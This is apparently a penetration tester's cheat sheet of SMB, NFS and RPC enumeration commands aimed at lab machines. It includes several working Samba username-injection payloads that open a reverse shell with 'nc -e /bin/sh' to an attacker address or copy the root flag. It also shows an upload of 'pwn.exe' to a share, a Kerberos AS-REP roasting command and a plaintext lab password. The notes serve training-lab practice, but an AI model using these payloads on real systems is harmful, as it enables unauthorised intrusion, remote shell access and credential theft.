https://github.com/absolomb/Pentesting/blob/master/guides/Initial%20Enumeration.md
#### smbmap

  smbmap -H "10.10.185.43" | tee "recon/smbmap_10.10.185.43.txt"    
  smbmap -H "10.10.185.43" -u milesdyson -p ')s{A&2Z=F^n_E.B`'
  smbmap -u null -p "" -H 10.10.83.190  -P 445 -R 
  
  `smbclient \\\\10.10.104.121\\nt4wrksv`
  .smb: \> put pwn.exe                                                                                                                                       │        dr--r--r--   
#### smbclient

  smbclient --user=milesdyson //10.10.185.43/milesdyson 

  smbclient -L "//10.10.185.43/" -U "guest"%| tee "recon/smbclient_10.10.185.43.txt"              
smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1'
  smbclient -L x.x.x.x
  
  smbmount //x.x.x.x/share /mnt –o username=hodor,workgroup=hodor
  
  smbclient //10.10.100.49/anonymous
  
  enum4linux -a ip
  
  
  
  
  client -U "" -N x.x.x.x  #Anonymous bind using rpcclient / Null connect
  
  smbclient //MOUNT/share #Connect to SMB share

  smbclient -U "/=&#92;&#96;nohup nc -e /bin/sh LHOST LPORT&#92;&#96;" -N -I ip //LAME/tmp

  nmap -T4 -sS -sC -Pn -A --script smb-vuln* ip
  
  smbclient //ip/tmp
  logon "./=`nohup nc -e /bin/sh LHOST LPORT`"

  smbclient -U "/=\`nohup cat /root/root.txt > /tmp/ttt\`" -N -I ip //LAME/tmp

  smbclient -U "/=\`nohup nc -e /bin/sh 10.10.15.11 60000\`" -N -I ip //LAME/tmp
  
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.100.49


mount
  mount ip:/vol/share /mnt/nfs  -nolock
  
  mount -t cifs -o username=user,password=pass,domain=blah //ip.X/share-name /mnt/cifs
  
  mount -t cifs //x.x.x.x/share /mnt
  
  mount -t cifs -o username=hodor,password=hodor //x.x.x.x/share /mnt
  
#### Mounting File Share
  showmount -e IPADDR
  sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other

# Port 111 - Rpcbind
	rpcinfo -p INSERTIPADDRESS

# Port 123-NTP
	ntp-info and ntp-monlist
	Check ntpd version for exploits
# Port 139/445 - SMB
	• Name:
	• Version:
	• Domain/workgroup name:
	• Domain-sid:
	• Allows unauthenticated login:

nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse INSERTIPADDRESS -p 445
```	
enum4linux -a INSERTIPADDRESS
rpcclient -U "" -N INSERTIPADDRESS		-c options
srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall
    smbclient -L INSERTIPADDRESS
    smbclient //INSERTIPADDRESS/tmp
    smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
    smbclient //INSERTIPADDRESS/ipc$ -U john 
	nmblookup -A INSERTIPADDRESS
#Admin acount
rpcclient $> enumdomgroups

rpcclient $> querygroup 0x200          
rpcclient $> querygroupmem 0x200
rpcclient $> queryuser 0x1f4            
```  
```
GetNPUsers.py -format john -no-pass -k -usersfile users -dc-ip 10.10.10.161 HTB.LOCAL/
```
